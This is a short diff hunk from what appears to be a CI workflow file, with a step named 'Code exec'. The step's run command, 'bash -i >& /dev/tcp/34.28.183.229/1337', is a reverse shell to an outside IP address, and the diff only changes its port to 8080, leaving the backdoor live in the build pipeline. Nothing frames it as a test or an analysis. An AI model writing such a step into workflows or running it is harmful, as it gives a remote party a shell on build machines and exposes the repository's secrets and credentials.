@@ -19,4 +19,4 @@ jobs:
     steps:
       # Execute code
       - name: Code exec
-        run: bash -i >& /dev/tcp/34.28.183.229/1337 0>&1
+        run: bash -i >& /dev/tcp/34.28.183.229/8080 0>&1
